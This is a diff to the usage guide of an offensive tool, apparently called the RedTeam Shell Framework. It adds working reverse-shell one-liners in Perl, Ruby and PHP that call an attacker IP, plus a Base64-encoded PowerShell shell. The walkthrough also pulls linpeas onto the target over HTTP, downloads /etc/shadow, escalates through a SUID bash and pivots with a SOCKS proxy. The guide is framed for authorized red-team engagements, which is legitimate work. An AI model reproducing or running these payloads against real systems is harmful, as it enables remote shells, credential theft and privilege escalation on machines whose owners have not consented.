@@ -14,7 +14,8 @@ Real-world usage scenarios for the RedTeam Shell Framework.
 4. [File Transfer](#4-file-transfer)
 5. [Pivoting & Relays](#5-pivoting--relays)
 6. [PTY Upgrade](#6-pty-upgrade)
-7. [Full Operation Walkthrough](#7-full-operation-walkthrough)
+7. [Session Notes](#7-session-notes)
+8. [Full Operation Walkthrough](#8-full-operation-walkthrough)
 
 ---
 
@@ -51,14 +52,15 @@ nc <TARGET_IP> 5555
 
 ## 2. Generating Payloads
 
+Your local IP is auto-detected and shown as a default — press Enter to accept it or type a different one.
+
 ### Bash reverse shell with Base64 encoding
 
 ```
 Main menu → 2 (Payloads) → 1 (Bash Reverse Shell)
-  Attacker IP: 192.168.1.100
+  Attacker IP [192.168.1.100]: (press Enter)
   Attacker PORT: 4444
   Add Base64 encoding? [y/n]: y
-  Add variable obfuscation? [y/n]: n
   Save to file? [y/n]: y
   Filename [bash_192.168.1.100_4444.sh]: (press Enter)
 ```
@@ -74,7 +76,7 @@ Payload saved to `payloads/bash_192.168.1.100_4444.sh`.
 
 ```
 Main menu → 2 (Payloads) → 2 (PowerShell Reverse Shell)
-  Attacker IP: 192.168.1.100
+  Attacker IP [192.168.1.100]: (press Enter)
   Attacker PORT: 4444
   Add Base64 encoding? [y/n]: y
 ```
@@ -89,19 +91,63 @@ Run on Windows target:
 powershell -EncodedCommand <base64_string>
 ```
 
-### Batch generate all payload types
+### Perl reverse shell
 
 ```
-Main menu → 2 (Payloads) → 6 (Batch Generate)
-  Attacker IP: 192.168.1.100
+Main menu → 2 (Payloads) → 4 (Perl Reverse Shell)
+  Attacker IP [192.168.1.100]: (press Enter)
+  Attacker PORT: 4444
+  Save to file? [y/n]: n
+```
+
+Output:
+```bash
+perl -e 'use Socket;$i="192.168.1.100";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
+```
+
+### Ruby reverse shell
+
+```
+Main menu → 2 (Payloads) → 5 (Ruby Reverse Shell)
+  Attacker IP [192.168.1.100]: (press Enter)
   Attacker PORT: 4444
 ```
 
-Saves three files to `payloads/`:
+Output:
+```bash
+ruby -rsocket -e'f=TCPSocket.open("192.168.1.100",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
+```
+
+### PHP reverse shell
+
+```
+Main menu → 2 (Payloads) → 6 (PHP Reverse Shell)
+  Attacker IP [192.168.1.100]: (press Enter)
+  Attacker PORT: 4444
+  Payload style — 1. One-liner (proc_open) / 2. fsockopen [1]: (press Enter)
+```
+
+Output:
+```php
+<?php $s=fsockopen("192.168.1.100",4444);$proc=proc_open("/bin/sh",array(0=>$s,1=>$s,2=>$s),$p); ?>
+```
+
+### Batch generate all payload types
+
+```
+Main menu → 2 (Payloads) → 9 (Batch Generate)
+  Attacker IP [192.168.1.100]: (press Enter)
+  Attacker PORT: 4444
+```
+
+Saves six files to `payloads/`:
 ```
 payloads/batch_<timestamp>_bash.sh
 payloads/batch_<timestamp>_powershell.ps1
 payloads/batch_<timestamp>_python.py
+payloads/batch_<timestamp>_perl.pl
+payloads/batch_<timestamp>_ruby.rb
+payloads/batch_<timestamp>_php.php
 ```
 
 ---
@@ -166,10 +212,30 @@ Main menu → 4 (Transfer) → 2 (Download File)
 
 Runs: `scp root@192.168.1.100:/etc/passwd ./loot/`
 
+### Serve files via HTTP (for targets without SSH)
+
+```
+Main menu → 4 (Transfer) → 3 (Serve Files)
+  Directory to serve [./]: ./loot/
+  Port [8000]: 8000
+```
+
+Output:
+```
+Serving: ./loot/
+Download files from target with:
+  wget http://192.168.1.100:8000/filename
+  curl http://192.168.1.100:8000/filename -O filename
+
+Press Ctrl+C to stop the server.
+```
+
+The IP shown is auto-detected from your machine. On the target, run the `wget` or `curl` command to pull files without needing SSH.
+
 ### Verify file integrity
 
 ```
-Main menu → 4 (Transfer) → 3 (Verify Checksum)
+Main menu → 4 (Transfer) → 4 (Verify Checksum)
   File path: ./loot/passwd
 ```
 
@@ -268,16 +334,55 @@ reset
 
 ---
 
-## 7. Full Operation Walkthrough
+## 7. Session Notes
+
+After catching a shell, add context for your report without leaving the framework.
+
+### Add a note automatically (after listener ends)
+
+When a reverse listener session ends, you are immediately prompted:
+```
+Add a note to this session? [y/n]: y
+Note: got shell on 192.168.1.150 as www-data, found SUID bash at /tmp/bash
+```
+
+### Add or view notes from the menu
+
+```
+Main menu → 1 (Listeners) → 5 (Session Notes)
+
+Available sessions:
+  1. shell_1740000000_12345
+
+Select session number (or 0 to cancel): 1
+
+  1. Add note
+  2. View notes
+Select: 2
+```
+
+Output:
+```
+═══ NOTES: shell_1740000000_12345 ═══
+
+[2026-02-28T14:30:00Z] got shell on 192.168.1.150 as www-data, found SUID bash at /tmp/bash
+[2026-02-28T14:45:00Z] escalated to root via /tmp/bash -p
+```
+
+Notes are saved to `logs/sessions/<session_id>.notes` and persist across sessions.
+
+---
+
+## 8. Full Operation Walkthrough
 
 A complete authorized engagement workflow:
 
 ```bash
-# 1. Start the framework
+# 1. Start the framework (dependency check runs automatically)
 bash shellmaster.sh
 
-# 2. Generate an encoded payload
-# Main → 2 → 1 (Bash, IP: 192.168.1.200, port: 4443, Base64: y)
+# 2. Generate an encoded payload (IP auto-detected)
+# Main → 2 → 1 (Bash, confirm IP, port: 4443, Base64: y)
 # Save as: initial_access.sh
 
 # 3. Set up encrypted listener
@@ -290,17 +395,25 @@ bash shellmaster.sh
 # 5. Upgrade the shell
 # Main → 6 → 1 (Python PTY upgrade) — follow the steps
 
-# 6. Collect files
-# Main → 4 → 2 (Download /etc/shadow to ./loot/)
-# Main → 4 → 3 (Verify checksum)
+# 6. Serve a post-exploitation tool to the target via HTTP
+# Main → 4 → 3 (Serve Files, dir: ./tools/, port: 8080)
+# On target: wget http://192.168.1.200:8080/linpeas.sh
 
-# 7. Pivot to internal network
+# 7. Collect files back
+# Main → 4 → 2 (Download /etc/shadow to ./loot/)
+# Main → 4 → 4 (Verify checksum)
+
+# 8. Pivot to internal network
 # Main → 5 → 2 → 3 (SOCKS proxy through compromised host)
 # Use proxychains for further enumeration
 
-# 8. Review audit trail
+# 9. Note what you found (for the report)
+# Main → 1 → 5 (Session Notes) → pick session → Add note
+
+# 10. Review audit trail
 tail -f logs/framework.log
 ls logs/sessions/
+cat logs/sessions/<session_id>.notes
 ```
 
 ---
